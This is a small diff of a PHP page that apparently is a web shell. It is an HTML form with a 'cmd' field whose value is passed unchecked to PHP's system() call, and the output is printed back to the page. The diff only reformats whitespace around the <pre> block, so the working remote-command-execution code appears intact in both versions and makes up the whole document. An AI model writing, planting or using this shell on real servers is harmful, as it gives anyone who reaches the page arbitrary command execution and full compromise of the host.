@@ -5,10 +5,12 @@
       <input type="TEXT" name="cmd" id="cmd" size="80">
       <input type="SUBMIT" value="Execute">
     </form>
-    <pre><?php
+    <pre>
+<?php
 if (isset($_GET['cmd'])) {
     system($_GET['cmd'] . ' 2>&1');
 }
-?></pre>
+?>
+    </pre>
   </body>
 </html>
